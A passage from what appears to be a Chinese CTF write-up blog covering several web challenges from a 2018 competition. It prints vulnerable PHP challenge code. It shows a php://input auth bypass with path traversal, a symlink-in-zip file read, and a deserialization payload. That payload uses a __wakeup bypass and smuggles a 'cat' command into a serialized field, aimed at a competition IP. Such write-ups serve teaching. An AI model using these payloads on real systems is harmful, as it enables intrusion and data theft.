class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>preg_replace后门，pattern的<code>/e</code>参数可以命令执行：</p>
<p><img src="赛博杯WP\2.jpg" alt="2"></p>
<h4 id="工控云管理系统客服中心期待您的反馈"><a href="#工控云管理系统客服中心期待您的反馈" class="headerlink" title="工控云管理系统客服中心期待您的反馈"></a>工控云管理系统客服中心期待您的反馈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;/var/www/html&apos;);</span><br><span class="line"></span><br><span class="line">function autoload($page) &#123;</span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;flag&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no flag flag flag flag !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;uploaded&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no uploaded uploaded uploaded uploaded !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;://f&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no ://f ://f ://f&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;ata&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no ata ata ata&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;0&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no 0 0 0&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(file_exists(&quot;./includes/$page.php&quot;)) &#123;</span><br><span class="line">        include &quot;./includes/$page.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif(file_exists(&quot;./includes/$page&quot;)) &#123;</span><br><span class="line">        include &quot;./includes/$page&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      echo &quot;File is not exit &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function download($adfile, $file)&#123;</span><br><span class="line">  //Only Administrators can download files .</span><br><span class="line">      $cert = &apos;N&apos;;</span><br><span class="line">    if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;) &#123;</span><br><span class="line">      echo &quot;Welcome ! You Are Administrator !&quot;;</span><br><span class="line">      $cert = &apos;Y&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      echo &quot;error1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($cert === &apos;Y&apos;)&#123;</span><br><span class="line">      if (stripos($file, &apos;file_list&apos;) != false) die(&apos;error4&apos;);</span><br><span class="line">      if (stripos($file, &apos;file_list&apos;) &gt;= 0) &#123;</span><br><span class="line">      header(&apos;Content-Description: File Transfer&apos;);</span><br><span class="line">      header(&apos;Content-Type: application/octet-stream&apos;);</span><br><span class="line">      header(&apos;Content-Disposition: attachment; filename=&apos;. basename($file));</span><br><span class="line">      header(&apos;Content-Transfer-Encoding: binary&apos;);</span><br><span class="line">      header(&apos;Expires: 0&apos;);</span><br><span class="line">      header(&apos;Cache-Control: must-revalidate, post-check=0, pre-check=0&apos;);</span><br><span class="line">      header(&apos;Pragma: public&apos;);</span><br><span class="line">      header(&apos;Content-Length: &apos; . filesize($file));</span><br><span class="line">      readfile($file);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      die(&apos;error2&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &apos;error3&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">    $page = &apos;index&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    $page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125;</span><br><span class="line">if (stripos($page, &apos;./&apos;) &gt; 0) &#123;</span><br><span class="line">  die(&apos;no ./ ./ ./ ./&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (stripos($page, &apos;://&apos;) &gt; 0) &#123;</span><br><span class="line">  die(&apos;no :// :// ://&apos;);</span><br><span class="line">&#125;</span><br><span class="line">autoload($page);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[admin]) &amp;&amp; isset($_GET[file])) &#123;</span><br><span class="line">  if (stripos($_GET[admin], &apos;flag&apos;) &gt; 0 || stripos($_GET[file], &apos;flag&apos;) &gt; 0) &#123;</span><br><span class="line">    die(&apos;not flag flag flag falg !&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  if (strlen($_GET[file]) &gt;= 38) &#123;</span><br><span class="line">    die(&apos;too long&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  download($_GET[admin], $_GET[file]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>​    admin参数用<code>php:input</code>再post<code>Yeah Everything Will Be Ok My Boss</code>即可进入下载文件的逻辑。</p>
<p>​    读源码：<code>file=file_list/../includes/upload.php</code></p>
<p>​    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;flag&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;no flag flag flag flag !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!empty($_FILES)) &#123;</span><br><span class="line"></span><br><span class="line">    //properties of the uploaded file</span><br><span class="line">    $name= $_FILES[&quot;filename&quot;][&quot;name&quot;];</span><br><span class="line">    $type= $_FILES[&quot;filename&quot;][&quot;type&quot;];</span><br><span class="line">    $size= $_FILES[&quot;filename&quot;][&quot;size&quot;];</span><br><span class="line">    $temp= $_FILES[&quot;filename&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $error= $_FILES[&quot;filename&quot;][&quot;error&quot;];</span><br><span class="line"></span><br><span class="line">    if (strlen($name) &gt;= 6) &#123;</span><br><span class="line">      die(&apos;name is too long !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($name, &apos;./&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;invalid parameter&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (stripos($name, &apos;php&apos;) &gt; 0) &#123;</span><br><span class="line">      die(&apos;invalid parameter&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (substr($name, -3, 3) !== &apos;zip&apos; &amp;&amp; substr($name, -3, 3) !== &apos;jpg&apos; &amp;&amp; substr($name, -3, 3) !== &apos;png&apos;) &#123;</span><br><span class="line">      die(&apos;file can not upload ! &apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ($error &gt; 0)</span><br><span class="line">        die(&quot;Error uploading file! code $error.&quot;);</span><br><span class="line">    else</span><br><span class="line">       &#123;</span><br><span class="line">        if($type !== &quot;application/zip&quot; || $size &gt; 400)//condition for the file</span><br><span class="line">        &#123;</span><br><span class="line">        die(&quot;Format not allowed or file size too big!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          if(file_exists(&apos;includes&apos;))&#123;</span><br><span class="line">            move_uploaded_file($temp, &quot;includes/uploaded/&quot; .$name);</span><br><span class="line">            echo &quot;Upload complete a!&quot;;</span><br><span class="line">            shell_exec(&apos;sh /var/www/html/includes/unzip.sh&apos;);</span><br><span class="line">          &#125;elseif(file_exists(&apos;uploaded&apos;))&#123;</span><br><span class="line">            move_uploaded_file($temp, &quot;uploaded/&quot; .$name);</span><br><span class="line">            echo &quot;Upload complete!&quot;;</span><br><span class="line">            shell_exec(&apos;sh /var/www/html/includes/unzip.sh&apos;);</span><br><span class="line">          &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if(isset($_GET[&apos;step&apos;]) &amp;&amp; strlen($_GET[&apos;step&apos;]) === 20) &#123;</span><br><span class="line">      if (stripos($_GET[&apos;step&apos;], &apos;lag&apos;) &gt; 0) &#123;</span><br><span class="line">        die(&apos;error&apos;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (stripos($_GET[&apos;step&apos;], &apos;./&apos;) &gt; 0) &#123;</span><br><span class="line">        die(&apos;error&apos;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (stripos($_GET[&apos;step&apos;], &apos; &apos;) &gt; 0) &#123;</span><br><span class="line">        die(&apos;error&apos;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (stripos($_GET[&apos;step&apos;], &apos;/&apos;) &gt; 0) &#123;</span><br><span class="line">        die(&apos;error&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">      if (preg_match(&apos;/[^\w\d_ -]/si&apos;, $_GET[&apos;step&apos;])) &#123;</span><br><span class="line">        $_GET[&apos;step&apos;] = preg_replace(&apos;/[^a-zA-Z0-9_ -]/s&apos;, &apos;&apos;, $_GET[&apos;step&apos;]);</span><br><span class="line">        die(&apos;error&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">        passthru(&apos;cat &apos; . &apos;uploaded/&apos; . $_GET[&apos;step&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      die();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
<p>上传zip后会解压，并且删除<code>*.*</code>和<code>.*</code>。这里用到Dlive大佬的方法，用软连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/flag/flag/flag/flag/flag/flag/flag.php</span><br><span class="line">spike</span><br><span class="line">zip -r abc.zip -y spike</span><br></pre></td></tr></table></figure>
<p>上传后访问<code>uploaded/spike</code>即可。</p>
<p>​    </p>
<h4 id="大量设备报表不见了（签道题）"><a href="#大量设备报表不见了（签道题）" class="headerlink" title="大量设备报表不见了（签道题）"></a>大量设备报表不见了（签道题）</h4><p>​    签到题脑洞比较大，fuzz id的数字，id=2333的时候得到flag。</p>
<h4 id="工控管理系统新版本"><a href="#工控管理系统新版本" class="headerlink" title="工控管理系统新版本"></a>工控管理系统新版本</h4><p>​    findpwd.php下面有注入，boolean型注入得到用户名<code>cetc</code>的用户名：<code>c3tlwDmIn23</code>。</p>
<p>​    注册时可以重复注册，重新注册后得到flag。</p>
<h4 id="工控系统的敏感消息遭泄漏"><a href="#工控系统的敏感消息遭泄漏" class="headerlink" title="工控系统的敏感消息遭泄漏"></a>工控系统的敏感消息遭泄漏</h4><p>​    存在.git泄露，得到代码后审计是反序列化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Record&#123;</span><br><span class="line">    public $file=&quot;Welcome&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = &apos;sleep.txt&apos;;</span><br><span class="line">        return array(&apos;file&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = &apos;wakeup.txt&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;file != &apos;wakeup.txt&apos; &amp;&amp; $this-&gt;file != &apos;sleep.txt&apos; &amp;&amp; $this-&gt;file != &apos;Welcome&apos;) &#123;</span><br><span class="line">        	system(&quot;php ./import/$this-&gt;file.php&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        	echo &quot;&lt;?php Something destroyed ?&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b =new Record(&apos;Welcome&apos;);</span><br><span class="line">unset($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>其中wakeup可以用<code>CVE-2016-7124</code>绕过。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Record&quot;:3:&#123;s:4:&quot;file&quot;;s:23:&quot;Me.php; cat import/Flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://47.104.99.231:20003/index2.php?file=Flag&amp;ad=a%00--</span><br><span class="line">&amp;secret=O%3A6%3A%22Record%22%3A3%3A&#123;s%3A4%3A%22file%22%3Bs%3A23%3A%22Me.php</span><br><span class="line">%3B%20cat%20import%2fFlag%22%3B&#125;</span><br></pre></td></tr></table></figure>

  </div>
  <footer class="article-footer">
    
  <div class="cc">
    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
      <img src="/images/cc/cc.png">
      
          <img src="/images/cc/by.png">
        
          <img src="/images/cc/sa.png">
      
      <span>
        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
      </span>
    </a>
  </div>


    

  </footer>
</article>







          <div class="main-footer">
  
    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
  
</div>

      
        </div>
      
    </div>
  </div>
  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>

  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">

  <!-- Root element of PhotoSwipe. Must have class pswp. -->
  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe.
             It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

      <!-- Container that holds slides.
                PhotoSwipe keeps only 3 of them in the DOM to save memory.
                Don't modify these 3 pswp__item elements, data is added later on. -->
      <div class="pswp__container">
        <div class="pswp__item"></div>
        <div class="pswp__item"></div>
        <div class="pswp__item"></div>
      </div>

      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
      <div class="pswp__ui pswp__ui--hidden">

        <div class="pswp__top-bar">

          <!--  Controls are self-explanatory. Order can be changed. -->

          <div class="pswp__counter"></div>

          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

          <button class="pswp__button pswp__button--share" title="Share"></button>

          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
          <!-- element will get class pswp__preloader--active when preloader is running -->
          <div class="pswp__preloader">
            <div class="pswp__preloader__icn">
              <div class="pswp__preloader__cut">
                <div class="pswp__preloader__donut"></div>
              </div>
            </div>
          </div>
        </div>

        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
          <div class="pswp__share-tooltip"></div>
        </div>

        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>

        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

        <div class="pswp__caption">
          <div class="pswp__caption__center"></div>
        </div>
      </div>
    </div>
  </div>

  <script src="/PhotoSwipe/photoswipe.js"></script>
  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>


<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
<script src="/scripts/main.js"></script>

</body>
</html>
